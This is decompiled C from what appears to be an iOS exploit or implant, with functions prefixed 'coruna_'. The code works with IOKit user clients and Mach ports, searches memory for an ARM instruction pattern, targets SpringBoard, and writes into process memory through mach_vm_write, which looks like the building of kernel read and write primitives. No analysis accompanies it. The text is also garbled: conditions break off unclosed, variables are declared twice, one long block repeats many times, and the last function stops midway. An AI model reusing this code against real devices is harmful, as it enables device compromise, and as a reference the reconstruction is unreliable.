  if (1 < *(mach_port_t *)(handle + 0xac) + 1) {
    p_Var1 = _pthread_from_mach_thread_np(*(mach_port_t *)(handle + 0xac));
    if (1 < *(semaphore_t *)(handle + 0xd0) + 1) {
      _semaphore_signal(*(semaphore_t *)(handle + 0xd0));
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(handle + 0xd0));
      *(uint32_t *)(handle + 0xd0) = 0;
    }
    if (p_Var1 != (pthread_t)0x0) {
      _pthread_join(p_Var1,(void **)0x0);
    }
    *(uint32_t *)(handle + 0xac) = 0;
  }
  address = *(vm_address_t *)(handle + 0xb0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xb8)
                  );
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  *(uint64_t *)(handle + 200) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return 0;
}





unsigned long coruna_mach_port_deallocate_281f0(long arg)

{
  uint type_id_13;
  int flags;
  uint u;
  unsigned long size;
  long serial_11;
  mach_port_name_t cache_40;
  
  serial_11 = *(long *)(&k_kernel_slot_1d48 + arg);
  if (serial_11 == 0) {
    size = 0xad001;
  }
  else if (*(int *)(serial_11 + 0x70) + 1U < 2) {
    size = 0;
  }
  else {
    cache_40 = 0;
    flags = coruna_ioconnectcallstructmethod(arg,&cache_40);
    if (flags == 0) {
      u = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_40);
      type_id_13 = 0;
      if (u != 0) {
        type_id_13 = u | 0x80000000;
      }
      size = (unsigned long)type_id_13;
    }
    else {
      size = coruna_mach_port_deallocate_13478(arg,0x14,*(uint32_t *)(serial_11 + 0x70));
    }
  }
  return size;
}





unsigned long coruna_ioconnectcallstructmethod(uint64_t arg,mach_port_name_t *val)

{
  uint type_id_13;
  unsigned long type_id_14;
  unsigned long u;
  uint64_t cache_43;
  mach_port_name_t cache_44;
  uint64_t cache_45;
  uint64_t url_buf;
  uint64_t cache_20;
  uint64_t json_buf;
  uint64_t cache_41;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  long cache_60;
  
  cache_60 = *(long *)k_kernel_stack_chk_guard_slot;
  cache_44 = 0;
  cache_43 = 0x40;
  type_id_14 = coruna_mach_port_mod_refs(arg,0x14,&cache_44);
  u = type_id_14;
  if ((int)type_id_14 == 0) {
    thread_attr = 0;
    cache_41 = 0;
    serial_buf = 0;
    host_info = 0;
    url_buf = 0;
    cache_45 = 0;
    json_buf = 0;
    cache_20 = 0;
    type_id_14 = _IOConnectCallStructMethod(cache_44,1,0,0,&cache_45,&cache_43);
    if ((uint)type_id_14 == 0) {
      u = 0;
      *val = cache_44;
      cache_44 = 0;
    }
    else {
      u = (unsigned long)((uint)type_id_14 | 0x80000000);
    }
  }
  if (1 < cache_44 + 1) {
    type_id_13 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_44);
    type_id_14 = (unsigned long)type_id_13;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_60) {
    return u;
  }
  ___stack_chk_fail(type_id_14);
}





unsigned long coruna_ioservicegetmatchingservice_28364(long arg)

{
  uint type_id_13;
  uint32_t type_id_14;
  uint8_t *str;
  int idx;
  uint version;
  long serial_14;
  long serial_12;
  uint64_t tag;
  long addr;
  unsigned long type_id_18;
  unsigned long kind;
  unsigned long type_id_21;
  long serial_17;
  bool idx;
  unsigned long cache_52;
  mach_port_name_t cache_61;
  uint64_t cache_57;
  long cache_58;
  uint64_t cache_43;
  long cache_32;
  unsigned long cache_45;
  unsigned long cache_21;
  
  cache_43 = 0;
  cache_32 = 0;
  cache_57 = 0;
  cache_58 = 0;
  cache_61 = 0;
  serial_17 = *(long *)(&k_kernel_slot_1d48 + arg);
  if (serial_17 == 0) {
    kind = 0xad022;
    if (1 < cache_61 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_61);
    }
    return kind;
  }
  idx = coruna_ioconnectcallstructmethod(arg,&cache_61);
  if (idx == 0) {
    if ((((*(long *)(serial_17 + 0x50) != 0) && (*(long *)(serial_17 + 0x58) != 0)) &&
        *(mach_port_name_t *)(serial_17 + 0x70) = cache_61;
        *(uint8_t *)(serial_17 + 0x4a) = 1;
        return 0;
  }
  else {
    type_id_21 = 0x28026;
    cache_21 = 0;
    serial_14 = coruna_kernel6544_via_kernel6544_via_return_zero_2b000(arg);
    kind = type_id_21;
    if (((serial_14 == 0) || (serial_14 = coruna_call_macho_data_seg_2bb24_2bdb4(arg,serial_14,"SpringBoard"), serial_14 == 0)) ||
       if (1 < cache_61 + 1) {
       _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_61);
       }
       return kind;
  }
  serial_14 = coruna_kernel6544_via_return_zero_2b000(arg,cache_61);
  if (serial_14 == 0) {
    kind = 0x28025;
    if (1 < cache_61 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_61);
    }
    return kind;
  }
  idx = coruna_kernel6544_residual_256(arg,serial_14 + 0x120,&cache_32);
  type_id_21 = 0x2800f;
  kind = type_id_21;
  if (1 < cache_61 + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_61);
  }
  return kind;
}





uint64_t coruna_kernel6544_residual_256(uint *size,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  uint64_t size;
  
  u = coruna_kernel6544_via_fcntl_1bf84_2();
  if ((int)u != 0) {
    size = *id_2;
    if ((*size & 0x5584001) != 0) {
      size = coruna_kernel6544_via_ctx_test_flag_7(size);
    }
    *id_2 = size;
  }
  return u;
}





void coruna_kernel6544_residual_257(long handle,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  coruna_kernel6544_via_fcntl_1c910(handle,val,&scratch,*(uint32_t *)(handle + 0x168),1);
  return;
}





uint8_t * coruna_pthread_mach_thread_np_1f90c(long handle)
{
  uint u;
  uint size;
  mach_port_t lm3;
  int err;
  pthread_t p_Var5;
  void **lppv6;
  unsigned long version;
  __darwin_pthread_handler_rec *p_Var8;
  long handle;
  uint64_t port;
  pthread_t p_Var11;
  pthread_t *pp_Var12;
  pthread_t *pp_Var13;
  uint8_t *ptr;
  unsigned long tag;
  unsigned long scratch;
  pthread_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t action;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  pthread_t block_ctx;
  long stack_guard;
  long sa_saved;
  uint64_t tmp_buf;
  uint64_t sa_new;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t path_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t tmp_buf;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  long region;
  
  tag = 0;
  region = *(long *)k_kernel_stack_chk_guard_slot;
  port = *(uint64_t *)k_kernel_vm_page_size_slot;
  scratch = 0;
  cache = 0;
  tmp_buf = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  path_buf = 0;
  work = 0;
  frame = 0;
  region = 0;
  sa_new = 0;
  url_buf = 0;
  plist = 0;
  stack_guard = 0;
  block_ctx = (pthread_t)0x0;
  tmp_buf = 0;
  sa_saved = 0;
  sa_saved = 0;
  action = 0;
  path_buf = 0;
  sa_new = 0;
  action = 0;
  serial_buf = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  host_info = 0;
  serial_buf = 0;
  host_info = 0;
  ptr = (uint8_t *)0x28008;
  bootargs = 0;
  scratch = (pthread_t)0x0;
  bootargs = 0;
  thread_attr = 0;
  do {
    p_Var5 = _calloc(1,0x78);
    (&scratch)[tag] = p_Var5;
    if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad009;
      p_Var5 = (pthread_t)0x0;
      if ((int)ptr == 0) {
      *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
      if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad001;
      }
      else {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      ptr = (uint8_t *)0x28026;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
      if ((int)ptr == 0) {
      *(unsigned long *)p_Var5->__opaque = scratch;
      *(uint64_t *)(p_Var5->__opaque + 8) = port;
      *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
      ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
      if (((int)ptr == 0) &&
      (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
      coruna_macho_text_sect(&block_ctx);
      bootargs = stack_guard + sa_saved + -0x20000;
      sa_saved = 0x20000;
      scratch = block_ctx;
      thread_attr = 0x20000;
      stack_guard = bootargs;
      handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
      if (handle == 0) {
      ptr = (uint8_t *)0xad011;
      }
      else {
      size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
      size = size >> 5 & 0xffff;
      if (size - 1 < 0xbff) {
      *(uint *)(p_Var5->__opaque + 0x28) = size;
      err = coruna_ctx_test_flag(handle,0x5584201);
      if ((err == 0) ||
      (ptr = (uint8_t *)
      coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
      ), (int)ptr == 0)) {
      ptr = (uint8_t *)0x0;
      }
      }
      else {
      ptr = (uint8_t *)0x28011;
      }
      }
      }
      }
      }
      }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot != region) {
      ___stack_chk_fail();
      }
      return ptr;
    }
    lppv6 = (void **)coruna_fn_ptr_cast(coruna_return_zero_21d34);
    size = _pthread_create(&block_ctx + tag,(pthread_attr_t *)0x0,lppv6,p_Var5);
    if (size != 0) {
      p_Var5 = (pthread_t)0x0;
      u = -size;
      if (-1 < (int)size) {
        u = size;
      }
      ptr = (uint8_t *)(unsigned long)(u | 0x40000000);
done:
      if ((int)ptr == 0) {
      *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
      if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad001;
      }
      else {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      ptr = (uint8_t *)0x28026;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
      if ((int)ptr == 0) {
      *(unsigned long *)p_Var5->__opaque = scratch;
      *(uint64_t *)(p_Var5->__opaque + 8) = port;
      *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
      ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
      if (((int)ptr == 0) &&
      (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
      coruna_macho_text_sect(&block_ctx);
      bootargs = stack_guard + sa_saved + -0x20000;
      sa_saved = 0x20000;
      scratch = block_ctx;
      thread_attr = 0x20000;
      stack_guard = bootargs;
      handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
      if (handle == 0) {
      ptr = (uint8_t *)0xad011;
      }
      else {
      size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
      size = size >> 5 & 0xffff;
      if (size - 1 < 0xbff) {
      *(uint *)(p_Var5->__opaque + 0x28) = size;
      err = coruna_ctx_test_flag(handle,0x5584201);
      if ((err == 0) ||
      (ptr = (uint8_t *)
      coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
      ), (int)ptr == 0)) {
      ptr = (uint8_t *)0x0;
      }
      }
      else {
      ptr = (uint8_t *)0x28011;
      }
      }
      }
      }
      }
      }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot != region) {
      ___stack_chk_fail();
      }
      return ptr;
    }
    lm3 = _pthread_mach_thread_np((&block_ctx)[tag]);
    if (lm3 + 1 < 2) {
fail:
      p_Var5 = (pthread_t)0x0;
      if ((int)ptr == 0) {
      *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
      if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad001;
      }
      else {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      ptr = (uint8_t *)0x28026;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
      if ((int)ptr == 0) {
      *(unsigned long *)p_Var5->__opaque = scratch;
      *(uint64_t *)(p_Var5->__opaque + 8) = port;
      *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
      ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
      if (((int)ptr == 0) &&
      (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
      coruna_macho_text_sect(&block_ctx);
      bootargs = stack_guard + sa_saved + -0x20000;
      sa_saved = 0x20000;
      scratch = block_ctx;
      thread_attr = 0x20000;
      stack_guard = bootargs;
      handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
      if (handle == 0) {
      ptr = (uint8_t *)0xad011;
      }
      else {
      size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
      size = size >> 5 & 0xffff;
      if (size - 1 < 0xbff) {
      *(uint *)(p_Var5->__opaque + 0x28) = size;
      err = coruna_ctx_test_flag(handle,0x5584201);
      if ((err == 0) ||
      (ptr = (uint8_t *)
      coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
      ), (int)ptr == 0)) {
      ptr = (uint8_t *)0x0;
      }
      }
      else {
      ptr = (uint8_t *)0x28011;
      }
      }
      }
      }
      }
      }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot != region) {
      ___stack_chk_fail();
      }
      return ptr;
    }
    *(mach_port_t *)(p_Var5->__opaque + 0x20) = lm3;
    if (p_Var5->__opaque[0x39] == '\0') {
      err = 0x3ea;
      do {
        err = err + -1;
        if (err == 0) {
          p_Var5 = (pthread_t)0x0;
          ptr = &k_kernel_slot_1001;
          if ((int)ptr == 0) {
          *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
          if (p_Var5 == (pthread_t)0x0) {
          ptr = (uint8_t *)0xad001;
          }
          else {
          p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
          p_Var5->__cleanup_stack = p_Var8;
          ptr = (uint8_t *)0x28026;
          if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
          tag = p_Var5->__sig;
          ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
          if ((int)ptr == 0) {
          *(unsigned long *)p_Var5->__opaque = scratch;
          *(uint64_t *)(p_Var5->__opaque + 8) = port;
          *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
          ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
          if (((int)ptr == 0) &&
          (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
          coruna_macho_text_sect(&block_ctx);
          bootargs = stack_guard + sa_saved + -0x20000;
          sa_saved = 0x20000;
          scratch = block_ctx;
          thread_attr = 0x20000;
          stack_guard = bootargs;
          handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
          if (handle == 0) {
          ptr = (uint8_t *)0xad011;
          }
          else {
          size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
          size = size >> 5 & 0xffff;
          if (size - 1 < 0xbff) {
          *(uint *)(p_Var5->__opaque + 0x28) = size;
          err = coruna_ctx_test_flag(handle,0x5584201);
          if ((err == 0) ||
          (ptr = (uint8_t *)
          coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
          ), (int)ptr == 0)) {
          ptr = (uint8_t *)0x0;
          }
          }
          else {
          ptr = (uint8_t *)0x28011;
          }
          }
          }
          }
          }
          }
          }
          if (*(long *)k_kernel_stack_chk_guard_slot != region) {
          ___stack_chk_fail();
          }
          return ptr;
        }
        _semaphore_timedwait(*(semaphore_t *)(handle + 0x264),(mach_timespec_t)0xf424000000000);
      } while (p_Var5->__opaque[0x39] == '\0');
    }
    version = coruna_kernel6544_via_return_zero_2b000(handle,lm3);
    if (version == 0) {
      ptr = (uint8_t *)0x28026;
      p_Var5 = (pthread_t)0x0;
      if ((int)ptr == 0) {
      *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
      if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad001;
      }
      else {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      ptr = (uint8_t *)0x28026;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
      if ((int)ptr == 0) {
      *(unsigned long *)p_Var5->__opaque = scratch;
      *(uint64_t *)(p_Var5->__opaque + 8) = port;
      *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
      ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
      if (((int)ptr == 0) &&
      (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
      coruna_macho_text_sect(&block_ctx);
      bootargs = stack_guard + sa_saved + -0x20000;
      sa_saved = 0x20000;
      scratch = block_ctx;
      thread_attr = 0x20000;
      stack_guard = bootargs;
      handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
      if (handle == 0) {
      ptr = (uint8_t *)0xad011;
      }
      else {
      size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
      size = size >> 5 & 0xffff;
      if (size - 1 < 0xbff) {
      *(uint *)(p_Var5->__opaque + 0x28) = size;
      err = coruna_ctx_test_flag(handle,0x5584201);
      if ((err == 0) ||
      (ptr = (uint8_t *)
      coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
      ), (int)ptr == 0)) {
      ptr = (uint8_t *)0x0;
      }
      }
      else {
      ptr = (uint8_t *)0x28011;
      }
      }
      }
      }
      }
      }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot != region) {
      ___stack_chk_fail();
      }
      return ptr;
    }
    if (((version + 0x5f0 ^ version) & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) == 0) {
      ptr = (uint8_t *)0x0;
      p_Var11 = (&block_ctx)[tag];
      (&scratch)[tag] = (pthread_t)0x0;
      (&block_ctx)[tag] = (pthread_t)0x0;
      tag = (unsigned long)((int)tag + 1);
      p_Var5->__sig = version;
      *(pthread_t *)(p_Var5->__opaque + 0x18) = p_Var11;
      if ((int)ptr == 0) {
      *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
      if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad001;
      }
      else {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      ptr = (uint8_t *)0x28026;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
      if ((int)ptr == 0) {
      *(unsigned long *)p_Var5->__opaque = scratch;
      *(uint64_t *)(p_Var5->__opaque + 8) = port;
      *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
      ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
      if (((int)ptr == 0) &&
      (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
      coruna_macho_text_sect(&block_ctx);
      bootargs = stack_guard + sa_saved + -0x20000;
      sa_saved = 0x20000;
      scratch = block_ctx;
      thread_attr = 0x20000;
      stack_guard = bootargs;
      handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
      if (handle == 0) {
      ptr = (uint8_t *)0xad011;
      }
      else {
      size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
      size = size >> 5 & 0xffff;
      if (size - 1 < 0xbff) {
      *(uint *)(p_Var5->__opaque + 0x28) = size;
      err = coruna_ctx_test_flag(handle,0x5584201);
      if ((err == 0) ||
      (ptr = (uint8_t *)
      coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
      ), (int)ptr == 0)) {
      ptr = (uint8_t *)0x0;
      }
      }
      else {
      ptr = (uint8_t *)0x28011;
      }
      }
      }
      }
      }
      }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot != region) {
      ___stack_chk_fail();
      }
      return ptr;
    }
    tag = tag + 1;
  } while (tag != 0x10);
  p_Var5 = (pthread_t)0x0;
  ptr = (uint8_t *)0xad011;
check_ok:
  pp_Var13 = &block_ctx;
  pp_Var12 = &scratch;
  tag = tag & 0xffffffff;
  do {
    p_Var11 = *pp_Var12;
    if (((p_Var11 != (pthread_t)0x0) && (1 < *(int *)(p_Var11->__opaque + 0x20) + 1U)) &&
       (*pp_Var13 != (pthread_t)0x0)) {
      p_Var11->__opaque[0x38] = '\x01';
      ___ulock_wake(0x201,p_Var11->__opaque + 0x24);
      _pthread_join(*pp_Var13,(void **)0x0);
      *pp_Var13 = (pthread_t)0x0;
      _free(p_Var11);
      *pp_Var12 = (pthread_t)0x0;
    }
    pp_Var13 = pp_Var13 + 1;
    pp_Var12 = pp_Var12 + 1;
    tag = tag - 1;
  } while (tag != 0);
cleanup:
  if ((int)ptr == 0) {
    *(pthread_t *)(&k_kernel_slot_1d48 + handle) = p_Var5;
    if (p_Var5 == (pthread_t)0x0) {
      ptr = (uint8_t *)0xad001;
    }
    else {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(handle,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      ptr = (uint8_t *)0x28026;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
        tag = p_Var5->__sig;
        ptr = (uint8_t *)coruna_vm_map_27414(handle,&scratch,port,p_Var8);
        if ((int)ptr == 0) {
          *(unsigned long *)p_Var5->__opaque = scratch;
          *(uint64_t *)(p_Var5->__opaque + 8) = port;
          *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(handle + 0x188) & tag) + scratch;
          ptr = (uint8_t *)coruna_kernel6544_via_ioservice_path(handle,0);
          if (((int)ptr == 0) &&
             (ptr = (uint8_t *)0xad001, *(long *)(&k_kernel_slot_19f8 + handle) != 0)) {
            coruna_macho_text_sect(&block_ctx);
            bootargs = stack_guard + sa_saved + -0x20000;
            sa_saved = 0x20000;
            scratch = block_ctx;
            thread_attr = 0x20000;
            stack_guard = bootargs;
            handle = coruna_strsep(&scratch,"E8 0B 80 52",0,1);
            if (handle == 0) {
              ptr = (uint8_t *)0xad011;
            }
            else {
              size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(block_ctx,handle + -8);
              size = size >> 5 & 0xffff;
              if (size - 1 < 0xbff) {
                *(uint *)(p_Var5->__opaque + 0x28) = size;
                err = coruna_ctx_test_flag(handle,0x5584201);
                if ((err == 0) ||
                   (ptr = (uint8_t *)
                              coruna_kernel6544_via_host_processor_count(handle,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60
                                          ), (int)ptr == 0)) {
                  ptr = (uint8_t *)0x0;
                }
              }
              else {
                ptr = (uint8_t *)0x28011;
              }
            }
          }
        }
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != region) {
    ___stack_chk_fail();
  }
  return ptr;
}





unsigned long coruna_kernel6544_via_kernel6544_via_return_zero_30860_3(long arg,unsigned long val,uint64_t n)

{
  int count;
  unsigned long type_id_14;
  uint64_t cache_41;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long cache_42;
  
  cache_42 = 0;
  thread_attr = 0;
  cache_41 = 0;
  serial_buf = 0;
  host_info = 0;
  count = coruna_kernel6544_via_return_zero_30860(arg,val,&cache_41,n);
  if (count == 0) {
    type_id_14 = 0;
  }
  else {
    type_id_14 = *(unsigned long *)(arg + 0x188) & val | cache_42 & 0xffffffffc000;
  }
  return type_id_14;
}





uint64_t coruna_vm_deallocate_1d60c(long handle)
{
  vm_address_t address;
  uint64_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    address = ptr[2];
    if ((address != 0) && (ptr[3] != 0)) {
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,ptr[3]);
      ptr[2] = 0;
      ptr[3] = 0;
      ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
      if (ptr == (uint64_t *)0x0) {
        return 0xad001;
      }
    }
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 9) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x34,*(uint32_t *)(ptr + 6));
    _pthread_join((pthread_t)ptr[5],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[9] = 0;
    ptr[8] = 0;
    ptr[0xb] = 0;
    ptr[10] = 0;
    ptr[0xd] = 0;
    ptr[0xc] = 0;
    ptr[0xe] = 0;
    _free(ptr);
    u = 0;
  }
  return u;
}





bool coruna_mach_vm_machine_attribute(long handle,mach_vm_address_t arg,uint32_t size)
{
  int err;
  int status;
  uint32_t scratch;
  vm_machine_attribute_val_t bootargs;
  
  scratch = size;
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
      if ((*(int *)(handle + 0xe8) + 1U < 2) ||
         ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
                                 (vm_offset_t)&scratch,4);
          bootargs = 7;
          _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
             (vm_offset_t)&scratch,4);
             bootargs = 7;
             _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1c910(handle,arg,&scratch,4,1);
        }
      }
      else {
        err = coruna_ioconnectcallmethod_1d1b4(handle,arg,&scratch,4,1);
      }
    }
    else {
      err = coruna_thread_switch(handle,arg,&scratch,4,1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x40))(handle,arg,&scratch,4,1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_thread_switch(long handle)
{
  uint8_t *ptr;
  vm_address_t lv2;
  long handle;
  long addr;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0xc000,1);
  lv2 = scratch;
  handle = *(long *)(handle + 0x440);
